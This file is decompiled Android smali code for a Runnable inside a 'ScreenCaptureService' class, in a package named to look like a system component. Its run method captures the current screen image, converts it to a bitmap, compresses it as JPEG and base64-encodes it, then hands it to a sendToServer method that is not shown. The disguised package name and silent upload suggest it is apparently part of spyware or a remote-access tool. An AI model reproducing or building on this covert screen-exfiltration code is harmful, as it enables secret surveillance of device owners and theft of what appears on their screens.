.class Lcom/system/android/ui/ScreenCaptureService$1;
.super Ljava/lang/Object;
.source "ScreenCaptureService.java"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/system/android/ui/ScreenCaptureService;->captureScreen(ILandroid/content/Intent;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lcom/system/android/ui/ScreenCaptureService;

.field final synthetic val$height:I

.field final synthetic val$width:I


# direct methods
.method constructor <init>(Lcom/system/android/ui/ScreenCaptureService;II)V
    .locals 0
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()V"
        }
    .end annotation

    .line 85
    iput-object p1, p0, Lcom/system/android/ui/ScreenCaptureService$1;->this$0:Lcom/system/android/ui/ScreenCaptureService;

    iput p2, p0, Lcom/system/android/ui/ScreenCaptureService$1;->val$width:I

    iput p3, p0, Lcom/system/android/ui/ScreenCaptureService$1;->val$height:I

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 7

    .line 89
    :try_start_0
    iget-object v0, p0, Lcom/system/android/ui/ScreenCaptureService$1;->this$0:Lcom/system/android/ui/ScreenCaptureService;

    invoke-static {v0}, Lcom/system/android/ui/ScreenCaptureService;->-$$Nest$fgetimageReader(Lcom/system/android/ui/ScreenCaptureService;)Landroid/media/ImageReader;

    move-result-object v0

    invoke-virtual {v0}, Landroid/media/ImageReader;->acquireLatestImage()Landroid/media/Image;

    move-result-object v0

    .line 90
    if-eqz v0, :cond_0

    .line 91
    invoke-virtual {v0}, Landroid/media/Image;->getPlanes()[Landroid/media/Image$Plane;

    move-result-object v1

    .line 92
    const/4 v2, 0x0

    aget-object v3, v1, v2

    invoke-virtual {v3}, Landroid/media/Image$Plane;->getBuffer()Ljava/nio/ByteBuffer;

    move-result-object v3

    .line 93
    aget-object v4, v1, v2

    invoke-virtual {v4}, Landroid/media/Image$Plane;->getPixelStride()I

    move-result v4

    .line 94
    aget-object v1, v1, v2

    invoke-virtual {v1}, Landroid/media/Image$Plane;->getRowStride()I

    move-result v1

    .line 95
    iget v5, p0, Lcom/system/android/ui/ScreenCaptureService$1;->val$width:I

    mul-int v6, v4, v5

    sub-int/2addr v1, v6

    .line 97
    div-int/2addr v1, v4

    add-int/2addr v5, v1

    iget v1, p0, Lcom/system/android/ui/ScreenCaptureService$1;->val$height:I

    sget-object v4, Landroid/graphics/Bitmap$Config;->ARGB_8888:Landroid/graphics/Bitmap$Config;

    invoke-static {v5, v1, v4}, Landroid/graphics/Bitmap;->createBitmap(IILandroid/graphics/Bitmap$Config;)Landroid/graphics/Bitmap;

    move-result-object v1

    .line 101
    invoke-virtual {v1, v3}, Landroid/graphics/Bitmap;->copyPixelsFromBuffer(Ljava/nio/Buffer;)V

    .line 102
    invoke-virtual {v0}, Landroid/media/Image;->close()V

    .line 104
    iget v0, p0, Lcom/system/android/ui/ScreenCaptureService$1;->val$width:I

    iget v3, p0, Lcom/system/android/ui/ScreenCaptureService$1;->val$height:I

    invoke-static {v1, v2, v2, v0, v3}, Landroid/graphics/Bitmap;->createBitmap(Landroid/graphics/Bitmap;IIII)Landroid/graphics/Bitmap;

    move-result-object v0

    .line 106
    new-instance v2, Ljava/io/ByteArrayOutputStream;

    invoke-direct {v2}, Ljava/io/ByteArrayOutputStream;-><init>()V

    .line 107
    sget-object v3, Landroid/graphics/Bitmap$CompressFormat;->JPEG:Landroid/graphics/Bitmap$CompressFormat;

    const/16 v4, 0x50

    invoke-virtual {v0, v3, v4, v2}, Landroid/graphics/Bitmap;->compress(Landroid/graphics/Bitmap$CompressFormat;ILjava/io/OutputStream;)Z

    .line 108
    invoke-virtual {v2}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B

    move-result-object v2

    const/4 v3, 0x2

    invoke-static {v2, v3}, Landroid/util/Base64;->encodeToString([BI)Ljava/lang/String;

    move-result-object v2

    .line 110
    iget-object v3, p0, Lcom/system/android/ui/ScreenCaptureService$1;->this$0:Lcom/system/android/ui/ScreenCaptureService;

    invoke-static {v3, v2}, Lcom/system/android/ui/ScreenCaptureService;->-$$Nest$msendToServer(Lcom/system/android/ui/ScreenCaptureService;Ljava/lang/String;)V

    .line 112
    invoke-virtual {v1}, Landroid/graphics/Bitmap;->recycle()V

    .line 113
    invoke-virtual {v0}, Landroid/graphics/Bitmap;->recycle()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    goto :goto_0

    .line 118
    :catchall_0
    move-exception v0

    goto :goto_1

    .line 115
    :catch_0
    move-exception v0

    .line 116
    :try_start_1
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    .line 118
    :cond_0
    :goto_0
    iget-object v0, p0, Lcom/system/android/ui/ScreenCaptureService$1;->this$0:Lcom/system/android/ui/ScreenCaptureService;

    invoke-static {v0}, Lcom/system/android/ui/ScreenCaptureService;->-$$Nest$mcleanup(Lcom/system/android/ui/ScreenCaptureService;)V

    .line 119
    nop

    .line 120
    return-void

    .line 118
    :goto_1
    iget-object v1, p0, Lcom/system/android/ui/ScreenCaptureService$1;->this$0:Lcom/system/android/ui/ScreenCaptureService;

    invoke-static {v1}, Lcom/system/android/ui/ScreenCaptureService;->-$$Nest$mcleanup(Lcom/system/android/ui/ScreenCaptureService;)V

    .line 119
    throw v0
.end method
